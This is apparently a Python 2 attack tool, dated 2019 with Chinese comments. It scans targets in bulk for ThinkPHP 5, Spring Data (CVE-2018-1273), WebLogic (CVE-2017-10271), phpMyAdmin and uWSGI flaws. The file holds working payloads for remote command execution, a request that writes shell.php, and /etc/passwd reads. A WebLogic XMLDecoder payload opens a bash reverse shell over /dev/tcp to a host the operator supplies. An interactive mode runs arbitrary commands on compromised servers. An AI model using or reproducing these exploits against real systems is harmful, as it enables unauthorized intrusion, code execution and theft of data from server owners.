#!/usr/bin/env python
# coding=utf-8
# code by GD
# Date 2019/07/27

import re
import sys
import socket
import base64
import httplib
import warnings
import requests
from termcolor import cprint
from urlparse import urlparse
warnings.filterwarnings("ignore")
reload(sys)
sys.setdefaultencoding('gbk')
httplib.HTTPConnection._http_vsn = 10
httplib.HTTPConnection._http_vsn_str = 'HTTP/1.0'
#超时设置
TMOUT=10

headers = {
    "Accept":"application/x-shockwave-flash, image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*",
    "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50", 
    "Content-Type":"application/x-www-form-urlencoded"
}
headers1={
	  "Accept":"application/x-shockwave-flash, image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*",
    "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50", 
		"Content-Type":"text/xml"
}
class cve_verify:
    def __init__(self, url):
        if url.startswith("http"):
        	self.url = url
        else:
      		self.url="http://"+url
        self.poc = {
                "cve-2018-1273":'''username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("FUZZINGCOMMAND")]=&password=&repeatedPassword=''',
      					"thinkphp5.0.23-rce":'''_method=__construct&filter[]=system&method=get&get[REQUEST_METHOD]=id''', #_method=__construct&filter[]=system&method=get&get[]=id _method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=ls
                "thinkphp5":'''/index.php?s=/Index/%5cthink%5capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id''', 
                "thinkphp5-0":'''/index.php?s=/Index/%5cthink%5capp/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1''',
                "thinkphp5-1":'''/index.php?s=index/%5cthink%5ctemplate%5cdriver%5cfile/write?cacheFile=shell.php&content=<?php%20phpinfo();?>''',
                	#5.0.x   /index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=phpinfo()
                "Weblogic(CVE-2017-10271)":'''/wls-wsat/CoordinatorPortType''',
                "phpmyadmin 4.8.1(CVE-2018-12613)":'''/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd''',
                "Phpmyadmin Scripts(WooYun-2016-199433)":'''action=test&configuration=O:10:"PMA_Config":1:{s:6:"source",s:11:"/etc/passwd";}''',
                "uWSGI PHP(CVE-2018-7490)":'''/..%2f..%2f..%2f..%2f..%2fetc/passwd''',
                	
                }
        self.shell = {
                "cve-2018-1273":'''username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("FUZZINGCOMMAND")]=&password=&repeatedPassword=''',
								"thinkphp5.0.23-rce":"_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=FUZZINGCOMMAND",
                "thinkphp5":'''/index.php?s=/Index/%5cthink%5capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=FUZZINGCOMMAND''',
                "Weblogic(CVE-2017-10271)":'''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> <soapenv:Header><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java version="1.4.0" class="java.beans.XMLDecoder"><void class="java.lang.ProcessBuilder"><array class="java.lang.String" length="3"><void index="0"><string>/bin/bash</string></void><void index="1"><string>-c</string></void><void index="2"><string>bash -i &gt;&amp; /dev/tcp/FUZZINGCOMMAND1/FUZZINGCOMMAND2 0&gt;&amp;1</string></void></array><void method="start"/></void></java></work:WorkContext></soapenv:Header><soapenv:Body/></soapenv:Envelope>''',
                }
#    def check(self, pocname, vulnstr):
#        if vulnstr.find("Active Internet connections") is not -1:
#            cprint("目标存在" + pocname + "漏洞..[Linux]", "red")
#            filecontent.writelines(pocname+" success!!!"+"\n")
#        elif vulnstr.find("Active Connections") is not -1:
#            cprint("目标存在" + pocname + "漏洞..[Windows]", "red")
#            filecontent.writelines(pocname+" success!!!"+"\n")
#        elif vulnstr.find("活动连接") is not -1:
#            cprint("目标存在" + pocname + "漏洞..[Windows]", "red")
#            filecontent.writelines(pocname+" success!!!"+"\n")
#        elif vulnstr.find("LISTEN") is not -1:
#            cprint("目标存在" + pocname + "漏洞..[未知OS]", "red")
#            filecontent.writelines(pocname+" success!!!"+"\n")
#        else:
#            cprint("目标不存在" + pocname +"漏洞..", "green")
    def scan(self):
              
        cprint("-------检测cve漏洞--------\n目标url:"+self.url, "cyan")
        filecontent.writelines("检测cve漏洞: "+self.url)
        filecontent.write("\n")
        try:
            
            req = requests.post(self.url+"/users", headers=headers, data=self.poc['cve-2018-1273'], timeout=TMOUT, verify=False)
           
            if req.status_code == 500 and "java.lang.Runtime" in req.text:
                cprint("目标存在cve-2018-1273漏洞..", "red")
                filecontent.writelines("cve-2018-1273 success!!!\n")
            else:
                cprint("目标不存在cve-2018-1273漏洞..", "green")
        except Exception as e:
            cprint("检测spring(cve-2018-1273)超时..", "cyan")
            print "超时原因: ", e
            
        try:
            
            req = requests.post(self.url+"/index.php?s=captch", headers=headers1, data=self.poc['thinkphp5.0.23-rce'], timeout=TMOUT, verify=False)
            #print req.text
            if "5.0.23" in req.text or "5.0.1" in req.text or "5.0.22" in req.text or "Server at" in req.text:
                cprint("目标可能存在thinkphp5.0.23-rce漏洞..", "red")
                filecontent.writelines("thinkphp5.0.23-rce success!!!\n")
            else:
                cprint("目标不存在thinkphp5.0.23-rce漏洞..", "green")
        except Exception as e:
            cprint("检测thinkphp5.0.23-rce超时..", "cyan")
            print "超时原因: ", e
        try:
            req3= requests.get(self.url+self.poc['thinkphp5-1'], headers=headers, timeout=TMOUT, verify=False)
            req2= requests.get(self.url+self.poc['thinkphp5-0'], headers=headers, timeout=TMOUT, verify=False)
            req = requests.get(self.url+self.poc['thinkphp5'], headers=headers, timeout=TMOUT, verify=False)
            #print req3.text
            if "groups=" in req.text or "PHP Version" in req2.text or "PHP Version" in req3.text:
                cprint("目标存在thinkphp5漏洞..", "red")
                filecontent.writelines("thinkphp5 success!!!\n")
#            elif "phpinfo" in req2.text:
#                cprint("目标存在thinkphp5.0.7漏洞..", "red")
#                filecontent.writelines("thinkphp5 success!!!\n")
            else:
                cprint("目标不存在thinkphp5漏洞..", "green")
        except Exception as e:
            cprint("检测thinkphp5超时..", "cyan")
            print "超时原因: ", e   
            
            
        try:
            
           req = requests.get(self.url+self.poc['Weblogic(CVE-2017-10271)'], headers=headers1, timeout=TMOUT, verify=False)
           #print req.text
           if "Service Name:" in req.text:
                cprint("目标存在Weblogic(CVE-2017-10271)漏洞..", "red")
                filecontent.writelines("Weblogic(CVE-2017-10271) success!!!\n")
           else:
                cprint("目标不存在Weblogic(CVE-2017-10271)漏洞..", "green")
        except Exception as e:
            cprint("检测Weblogic(CVE-2017-10271)超时..", "cyan")
            print "超时原因: ", e 
        try:
            
           req = requests.get(self.url+self.poc['phpmyadmin 4.8.1(CVE-2018-12613)'], headers=headers, timeout=TMOUT, verify=False)
           #print req.text
           if "root:" in req.text:
                cprint("目标存在phpmyadmin 4.8.1(CVE-2018-12613)文件包含漏洞..", "blue")
                filecontent.writelines("phpmyadmin 4.8.1(CVE-2018-12613) success!!!\n")
           else:
                cprint("目标不存在phpmyadmin 4.8.1(CVE-2018-12613)漏洞..", "green")
        except Exception as e:
            cprint("检测phpmyadmin 4.8.1(CVE-2018-12613)超时..", "cyan")
            print "超时原因: ", e 
        try:
            
            req = requests.post(self.url+"/scripts/setup.php", headers=headers, data=self.poc['Phpmyadmin Scripts(WooYun-2016-199433)'], timeout=TMOUT, verify=False)
            #print req.text
            if "root:" in req.text:
                cprint("目标存在Phpmyadmin Scripts(WooYun-2016-199433)漏洞..", "blue")
                filecontent.writelines("Phpmyadmin Scripts(WooYun-2016-199433) success!!!\n")
            else:
                cprint("目标不存在Phpmyadmin Scripts(WooYun-2016-199433)漏洞..", "green")
        except Exception as e:
            cprint("检测Phpmyadmin Scripts(WooYun-2016-199433)超时..", "cyan")
            print "超时原因: ", e
            
        try:
            
           req = requests.get(self.url+self.poc['uWSGI PHP(CVE-2018-7490)'], headers=headers, timeout=TMOUT, verify=False)
           #print req.text
           if "root:" in req.text:
                cprint("目标存在uWSGI PHP(CVE-2018-7490)目录穿越漏洞..", "blue")
                filecontent.writelines("uWSGI PHP(CVE-2018-7490) success!!!\n")
           else:
                cprint("目标不存在uWSGI PHP(CVE-2018-7490)漏洞..", "green")
        except Exception as e:
            cprint("检测uWSGI PHP(CVE-2018-7490)超时..", "cyan")
            print "超时原因: ", e 
            
            
            
    def banner(self):
        cprint('''
      ______    ____       ____                  
     /         |    \     / ___|  ___ __ _ _ __  
    /     ___  |     \____\___ \ / __/ _` | '_ \ 
    |       |  |     /_____|__) | (_| (_| | | | |
    \_______|  |____/     |____/ \___\__,_|_| |_|
                                        Code by GD.
            ''', 'cyan')
    
    def inShell(self, pocname):
        
        cprint("-------cve 交互式shell--------\n目标url:"+self.url, "cyan")
        prompt = "shell >>"
        if pocname == "Weblogic(CVE-2017-10271)":
          command = raw_input('输入反弹shell的主机>> ')
          command1 = raw_input('输入反弹shell的端口>> ')
          try:          
                
                data1=self.shell[pocname].replace("FUZZINGCOMMAND1", command)
                data2=data1.replace("FUZZINGCOMMAND2", command1)
                #print data2
                req = requests.post(self.url+"/wls-wsat/CoordinatorPortType",data=data2, headers=headers1, timeout=TMOUT, verify=False)
                print "success"
          except:
                cprint("命令执行失败!!!", "red")
        
        
        else:
            while True:
                print prompt,
                command = raw_input()
                command = command.strip()
                
                if command != "exit":
                    if pocname == "cve-2018-1273":
                      
                        commurl = self.url+"/users"
                         
                    elif pocname == "thinkphp5.0.23-rce":		
                     
                        commurl = self.url+"/index.php?s=captcha"
                        
                    else:
                        commurl = self.url
                    try:
                        if pocname=="thinkphp5":
                           #print commurl+self.shell[pocname].replace("FUZZINGCOMMAND", command)
                           req = requests.get(commurl+self.shell[pocname].replace("FUZZINGCOMMAND", command), headers=headers, timeout=TMOUT, verify=False)
                           print req.text
                        else:
                           #print self.shell[pocname].replace("FUZZINGCOMMAND", command)
                           req = requests.post(commurl, data=self.shell[pocname].replace("FUZZINGCOMMAND", command), headers=headers, timeout=TMOUT, verify=False)
                           print req.text
                    except:
                        cprint("命令执行失败!!!", "red")		
                    		
                    		
                else:
                    sys.exit(1)
        
     
if __name__ == "__main__":
    filecontent = open("success.txt", "a+")
    try:
        if sys.argv[1] == "-f":            
            with open(sys.argv[2]) as f:
                for line in f.readlines():
                    line = line.strip()
                    cveVuln = cve_verify(line)
                    cveVuln.scan()
        elif sys.argv[1] == "-u" and sys.argv[3] == "-i":            
            cveVuln = cve_verify(sys.argv[2].strip())
            cveVuln.banner()
            cveVuln.inShell(sys.argv[4].strip())
        else:
            
            cveVuln = cve_verify(sys.argv[1].strip())    
            cveVuln.banner()        
            cveVuln.scan()
    except Exception as e:
        figlet = ''

